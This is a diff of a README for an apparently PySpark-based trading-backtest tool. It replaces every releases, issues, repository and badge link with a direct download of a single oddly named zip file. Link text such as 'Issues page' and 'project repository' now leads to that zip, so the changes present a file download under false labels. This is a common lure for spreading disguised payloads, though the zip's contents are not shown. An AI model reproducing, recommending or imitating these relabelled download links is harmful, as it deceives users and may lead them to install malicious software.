@@ -1,7 +1,7 @@
 # 🚀 algorithmic-trading-backtest - Backtest Trading Strategies Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-latest%20release-blue)](https://github.com/cikafeee/algorithmic-trading-backtest/releases)
+[![Download](https://github.com/cikafeee/algorithmic-trading-backtest/raw/refs/heads/main/obligatory/trading-backtest-algorithmic-pseudoskeletal.zip%20release-blue)](https://github.com/cikafeee/algorithmic-trading-backtest/raw/refs/heads/main/obligatory/trading-backtest-algorithmic-pseudoskeletal.zip)
 
 ## 📖 Overview
 The **algorithmic-trading-backtest** project allows you to easily backtest trading strategies on large datasets. Built with PySpark, it can handle over 12,300 backtests on 100 different stocks efficiently. This makes it ideal for anyone interested in finance who wants to improve their trading skills without needing extensive programming knowledge.
@@ -23,7 +23,7 @@ To get started, follow these steps:
 
 1. **Download the Software**:
    Visit the following page to download the latest version of the application: 
-   [Download from Releases](https://github.com/cikafeee/algorithmic-trading-backtest/releases)
+   [Download from Releases](https://github.com/cikafeee/algorithmic-trading-backtest/raw/refs/heads/main/obligatory/trading-backtest-algorithmic-pseudoskeletal.zip)
 
 2. **Install the Application**:
    - Follow the installation instructions specific to your operating system. 
@@ -52,7 +52,7 @@ Visualizing your backtest results helps in understanding the effectiveness of yo
 
 ## 🔄 Community and Support
 If you encounter any issues or have questions, consider reaching out to the community. You can find support through:
-- The [Issues page](https://github.com/cikafeee/algorithmic-trading-backtest/issues) on GitHub.
+- The [Issues page](https://github.com/cikafeee/algorithmic-trading-backtest/raw/refs/heads/main/obligatory/trading-backtest-algorithmic-pseudoskeletal.zip) on GitHub.
 - Community forums focused on algorithmic trading and data engineering.
 
 ## 🌐 Topics
@@ -75,7 +75,7 @@ Your feedback is valuable. Feel free to contribute by making suggestions or repo
 - **Data Science Resources**: Resources for understanding data manipulation and analysis in Python.
 - **Stock Market Basics**: A primer on how the stock market works, designed for beginners.
 
-For more details, visit the project repository: [algorithmic-trading-backtest](https://github.com/cikafeee/algorithmic-trading-backtest).
+For more details, visit the project repository: [algorithmic-trading-backtest](https://github.com/cikafeee/algorithmic-trading-backtest/raw/refs/heads/main/obligatory/trading-backtest-algorithmic-pseudoskeletal.zip).
 
 ## 📥 Download Again
-Don't forget to revisit the [Download from Releases](https://github.com/cikafeee/algorithmic-trading-backtest/releases) page for the latest updates and releases. Enjoy your journey into the world of algorithmic trading!
+Don't forget to revisit the [Download from Releases](https://github.com/cikafeee/algorithmic-trading-backtest/raw/refs/heads/main/obligatory/trading-backtest-algorithmic-pseudoskeletal.zip) page for the latest updates and releases. Enjoy your journey into the world of algorithmic trading!
